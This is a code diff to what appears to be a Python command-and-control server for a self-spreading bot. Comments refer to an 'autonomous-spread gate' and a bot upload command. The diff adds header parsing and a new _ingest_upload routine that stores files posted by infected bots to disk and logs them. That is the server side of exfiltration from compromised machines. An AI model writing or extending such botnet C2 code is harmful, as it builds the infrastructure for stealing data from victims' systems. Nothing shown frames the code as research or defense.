@@ -270,7 +270,11 @@ class State:
 # connected flag drop and the autonomous-spread gate open (#95).
 
 def recv_http(conn):
-    """Read one HTTP request from conn. Returns (method, path, body) or None on close."""
+    """Read one HTTP request from conn.
+
+    Returns (method, path, body, headers) or None on close. `headers` is a
+    lower-cased dict of the request headers (used for Content-Type routing
+    of uploads, #134)."""
     conn.settimeout(30)
     buf = b""
     try:
@@ -294,19 +298,23 @@ def recv_http(conn):
                 if len(parts) < 2:
                     return None
                 method, path = parts[0], parts[1]
+                headers = {}
                 clen = 0
                 for h in lines[1:]:
-                    if h.lower().startswith("content-length:"):
+                    if ":" not in h:
+                        continue
+                    k, v = h.split(":", 1)
+                    headers[k.strip().lower()] = v.strip()
+                    if k.strip().lower() == "content-length":
                         try:
-                            clen = int(h.split(":", 1)[1].strip())
+                            clen = int(v.strip())
                         except ValueError:
                             clen = 0
-                        break
                 if len(rest) < clen:
                     break  # need more body bytes
                 body = rest[:clen]
                 buf = rest[clen:]
-                return method, path, body
+                return method, path, body, headers
     except (socket.timeout, ConnectionError, OSError):
         return None
 
@@ -347,6 +355,38 @@ def http_send_file(conn, path, ctype):
         pass
 
 
+def _ingest_upload(c2, body, ip, path):
+    """Persist an uploaded file from the bot (#134).
+
+    Writes the raw bytes to <payload_dir>/uploads/<ts>-<ip>.bin and logs
+    the receipt (size + source). Previously these POSTs were acked and
+    dropped. Returns the saved path or None."""
+    if not body:
+        return None
+    up_dir = os.path.join(c2.payload_dir, "uploads")
+    try:
+        os.makedirs(up_dir, exist_ok=True)
+    except OSError:
+        pass
+    ts = int(time.time() * 1000)
+    # basename of an explicit /upload/<name> if present, else ip timestamp
+    name = os.path.basename(path.rstrip("/")) if path.endswith("/upload") \
+        else f"upload-{ts}-{ip.replace('.', '_')}.bin"
+    if not name or name == "upload":
+        name = f"upload-{ts}-{ip.replace('.', '_')}.bin"
+    dest = os.path.join(up_dir, name)
+    try:
+        with open(dest, "wb") as f:
+            f.write(body)
+        c2.state.add_event("upload", f"{len(body)} bytes from {ip} -> {dest}")
+        log(f"UPLOAD {ip} {len(body)} bytes -> {dest}")
+        c2.ev(f"C2 UPLOAD {ip} {len(body)} bytes -> {dest}")
+        return dest
+    except OSError as e:
+        log(f"UPLOAD FAIL {ip}: {e}")
+        return None
+
+
 def handle_http(conn, addr, c2):
     ip = addr[0]
     try:
@@ -354,13 +394,28 @@ def handle_http(conn, addr, c2):
             req = recv_http(conn)
             if req is None:
                 return
-            method, path, body = req
+            method, path, body, headers = req
             path = path.rstrip("/")
+            ctype = (headers.get("content-type") or "").lower()
             text = body.decode("utf-8", errors="replace")
             try:
                 j = json.loads(text) if text else {}
             except json.JSONDecodeError:
                 j = {}
+
+            # #134: bot `upload` command POSTs the file as
+            # application/octet-stream (src/protocol.c http_upload). The
+            # default remote path is the heartbeat path, so an octet-stream
+            # POST there is an upload, NOT a command response (those are
+            # JSON). Explicit `upload <f> /upload` (or any http:// URL with
+            # path /upload) hits the dedicated route below. Both persist the
+            # bytes — previously they were acked and silently dropped.
+            if method == "POST" and (
+                    (path == c2.http_path.rstrip("/") and "octet-stream" in ctype)
+                    or path.endswith("/upload")):
+                _ingest_upload(c2, body, ip, path)
+                http_send(conn, json.dumps({"status": "ok", "secret": c2.secret}))
+                continue
 
             if method == "POST" and path == c2.http_path.rstrip("/"):
                 kind = "heartbeat" if j.get("cmd") == "status" else "response"
